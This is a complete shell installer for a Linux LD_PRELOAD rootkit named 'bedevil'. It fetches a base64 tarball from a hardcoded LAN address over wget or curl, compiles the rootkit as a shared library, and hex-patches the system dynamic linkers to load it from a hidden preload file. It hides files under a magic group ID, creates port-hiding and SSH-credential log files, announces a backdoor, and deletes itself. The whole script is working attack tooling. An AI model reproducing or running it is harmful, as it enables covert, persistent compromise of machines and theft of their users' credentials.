#!/bin/sh

[ -z "$1" ] && B64TARGZ_LOCATION="http://192.168.0.48:9001/changeme.b64" # changeme
WORKDIR="/tmp" # & mayb this.

[ `id -u` != 0 ] && { echo "not root..."; exit; }
[ ! -e /proc ] && { echo "no /proc, bail"; exit; }
[ ! -f /etc/ssh/sshd_config ] && echo "no sshd_config found..."
[ -d /proc/xen ] && echo "Xen environment detected"
[ -d /proc/vz ] && echo "OpenVZ environment detected"
[ -f /usr/bin/lveps ] && echo "CloudLinux LVE detected"
bin_path(){ echo -n `which $1 2>/dev/null || echo -n 'nahhh'`; }
[ ! -f `bin_path gcc` ] && echo "no gcc found...we should install it"
[ ! -f `bin_path base64` ] && { echo 'missing base64 util... install it.' && exit; }
[ ! -f `bin_path tar` ] && { echo 'missing tar...? install it.' && exit; }
dlfile(){ # $1 = src, $2 = dest
    if test "$DWNLDR" = "wget"; then DL_C="$DWNLDR -q $1 -O $2"; fi
    if test "$DWNLDR" = "curl"; then DL_C="$DWNLDR -s $1 -o $2"; fi
    $DL_C || { echo 'failed downloading target file.'; rm -f $2; exit; }
}
install_deps(){
    echo 'installing deps'
    [ -f /usr/bin/yum ] && yum install -e 0 gcc newt libgcc.i686 glibc-devel.i686 glibc-devel vim-common pam-devel libpcap libpcap-devel
    [ -f /usr/bin/pacman ] && { pacman -Syy && pacman -S glibc base-devel pam libpcap; }
    if [ -f /usr/bin/apt-get ]; then
        PLATFORM="`uname -m | sed -e 's/^\(.\{4\}\).*/\1/'`"
        if test "$PLATFORM" = "armv"; then dpkg --add-architecture i386; fi
        apt-get --yes --force-yes update
        for pkg in gcc-multilib build-essential libpam0g-dev libpcap-dev libpcap0.8-dev; do
            apt-get --yes --force-yes install $pkg
        done
        grep -i ubuntu /proc/version &>/dev/null && rm -f /etc/init/plymouth*
    fi
    echo 'done installing deps'
}
hstr(){
    local hs="`echo "$1" | xxd -p -`"
    hs="`echo "$hs" | sed 's/0a//' -`"
    printf "${hs}00" | awk '{print toupper($0)}'
}
patch_dynamic_linker(){
    local ho_preload hn_preload
    ho_preload="`hstr /etc/ld.so.preload`" # hex our strings
    hn_preload="`hstr $PRELOAD_FILE`"

    for lib in /lib/ld-linux.so.2 /lib/ld-linux.so.3 /lib/ld-linux-armhf.so.3 /lib32/ld-2.31.so /lib32/ld-linux.so.2 /lib64/ld-linux-x86-64.so.2; do
        [ ! -f $lib ] && continue
        echo "patching $lib"
        hexdump -ve '1/1 "%.2X"' $lib | sed "s/$ho_preload/$hn_preload/g" | xxd -r -p > $lib.tmp
        chmod --reference $lib $lib.tmp
        mv $lib.tmp $lib
    done
}
_LOCATION="`printf "$B64TARGZ_LOCATION" | sed -e 's/^\(.\{4\}\).*/\1/'`"
if test "$_LOCATION" = "http"; then
    [ -f `bin_path wget` ] && DWNLDR='wget'
    [ -f `bin_path curl` ] && DWNLDR='curl'
    [ -z $DWNLDR ] && { echo 'you need wget/curl... install one.' && exit; }
fi
[ ! -f `bin_path base64` ] && { echo 'missing base64 util... install it.' && exit; }
[ ! -f `bin_path tar` ] && { echo 'missing tar...? install it.' && exit; }

printf "\n\tBEGINNING INSTALLATION.\n\n"
[ ! -z "$1" ] && mv "$1" $WORKDIR/
echo 'entering workdir'
cd $WORKDIR

[ -z "$1" ] && B64TARGZ_FILENAME="`basename $B64TARGZ_LOCATION`"
[ ! -z "$1" ] && B64TARGZ_FILENAME="$1"
if test "$_LOCATION" = "http"; then
    echo "downloading $B64TARGZ_FILENAME from $B64TARGZ_LOCATION"
    dlfile $B64TARGZ_LOCATION $B64TARGZ_FILENAME
fi
TARGZ_NAME="${B64TARGZ_FILENAME}.tar.gz"
echo "archive name: $TARGZ_NAME"

echo "reverting b64 into orig tar"
cat $B64TARGZ_FILENAME | base64 -d > $TARGZ_NAME || { echo "couldn't revert b64 to orig tar" && rm -f $B64TARGZ_FILENAME $TARGZ_NAME; exit; }
[ ! -f $TARGZ_NAME ] && { echo "tar doesn't exist...? exiting." && rm -f $B64TARGZ_FILENAME; exit; }

INCLUDE_DIR="`tar tzf $TARGZ_NAME | head -1 | cut -f1 -d"/"`"
echo "got tar. extracting it."
tar xpfz $TARGZ_NAME >/dev/null && echo "done. removing it." && rm $TARGZ_NAME $B64TARGZ_FILENAME
[ ! -d "$INCLUDE_DIR" ] && { echo "include dir doesn't exist...? exiting."; rm -f $TARGZ_NAME $B64TARGZ_FILENAME; exit; }

printf "\ngetting settings\n"
MAGIC_GID="`sed '1q;d' $INCLUDE_DIR/settings.cfg`"
INSTALL_DIR="`sed '2q;d' $INCLUDE_DIR/settings.cfg`"
PRELOAD_FILE="`sed '3q;d' $INCLUDE_DIR/settings.cfg`"
BDVLSO="`sed '4q;d' $INCLUDE_DIR/settings.cfg`"
SOPATH="`sed '5q;d' $INCLUDE_DIR/settings.cfg`"
HIDEPORTS="`sed '6q;d' $INCLUDE_DIR/settings.cfg`"
SSH_LOGS="`sed '7q;d' $INCLUDE_DIR/settings.cfg`"
INTEREST_DIR="`sed '8q;d' $INCLUDE_DIR/settings.cfg`"
BD_VAR="`sed '9q;d' $INCLUDE_DIR/settings.cfg`"
GID_PATH="`sed '10q;d' $INCLUDE_DIR/settings.cfg`"
GIDTIME_PATH="`sed '11q;d' $INCLUDE_DIR/settings.cfg`"
printf "done getting config values\n"

install_deps

echo "compiling rootkit"
LINKER_FLAGS="-ldl -lcrypt"
WARNING_FLAGS="-Wall"
OPTIMIZATION_FLAGS="-O0 -g0"
OPTIONS="-fomit-frame-pointer -fPIC"
LINKER_OPTIONS="-Wl,--build-id=none"
PLATFORM="`uname -m`"
_PLATFORM="`printf $PLATFORM | sed -e 's/^\(.\{4\}\).*/\1/'`"
if test "$_PLATFORM" = "armv"; then PLATFORM="`printf $PLATFORM | sed 's/.*\(...\)/\1/'`"; fi
gcc -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.$PLATFORM
gcc -m32 -std=gnu99 $OPTIMIZATION_FLAGS $INCLUDE_DIR/bedevil.c $WARNING_FLAGS $OPTIONS -I$INCLUDE_DIR -shared $LINKER_FLAGS $LINKER_OPTIONS -o $INCLUDE_DIR/$BDVLSO.i686 2>/dev/null
strip $INCLUDE_DIR/$BDVLSO.$PLATFORM 2>/dev/null || { echo "couldn't strip rootkit, exiting"; rm -rf $INCLUDE_DIR; exit; }
[ -f $INCLUDE_DIR/$BDVLSO.i686 ] && strip $INCLUDE_DIR/$BDVLSO.i686
echo "rootkit compiled"
echo "installing"
[ ! -d $INSTALL_DIR ] && mkdir -p $INSTALL_DIR
mv $INCLUDE_DIR/$BDVLSO.$PLATFORM $INSTALL_DIR/
[ -f $INCLUDE_DIR/$BDVLSO.i686 ] && mv $INCLUDE_DIR/$BDVLSO.i686 $INSTALL_DIR/

printf "\nrootkit installed\n"
echo "preparing stuff"

mv $INCLUDE_DIR/.bashrc $INSTALL_DIR/ 2>/dev/null
echo ". .bashrc" > $INSTALL_DIR/.profile
touch $HIDEPORTS && chmod 644 $HIDEPORTS && cat $INCLUDE_DIR/hideports > $HIDEPORTS
mkdir -p $INTEREST_DIR && chmod 666 $INTEREST_DIR
touch $SSH_LOGS && chmod 666 $SSH_LOGS
touch $GID_PATH && chmod 644 $GID_PATH && printf $MAGIC_GID > $GID_PATH
touch $GIDTIME_PATH && chmod 640 $GIDTIME_PATH
touch $INSTALL_DIR/my_ass
touch $PRELOAD_FILE

rm -r $INCLUDE_DIR

echo "hiding everything"
chown -h 0:$MAGIC_GID $PRELOAD_FILE $INSTALL_DIR $INSTALL_DIR/* $INSTALL_DIR/.profile
chown 0:$MAGIC_GID $INSTALL_DIR/.bashrc 2>/dev/null
chown 0:$MAGIC_GID $SSH_LOGS
chown 0:$MAGIC_GID $INTEREST_DIR
chown 0:$MAGIC_GID $HIDEPORTS
chown 0:$MAGIC_GID $GID_PATH
chown 0:$MAGIC_GID $GIDTIME_PATH

patch_dynamic_linker

echo 'writing $SOPATH to $PRELOAD_FILE'
printf "$SOPATH" > $PRELOAD_FILE || { printf '\nfailed writing to $PRELOAD_FILE. exiting\n'; rm -rf $INSTALL_DIR $HIDEPORTS $SSH_LOGS $INTEREST_DIR $GID_PATH; exit; }
printf "\ninstallation finished\nconnect using your backdoor credentials\n"

SCRIPT_PATH="`pwd`/$0"
[ -f $SCRIPT_PATH ] && [[ "`cat $SCRIPT_PATH | head -n1`" == '#!/bin/sh' ]] && rm -f $SCRIPT_PATH
exit
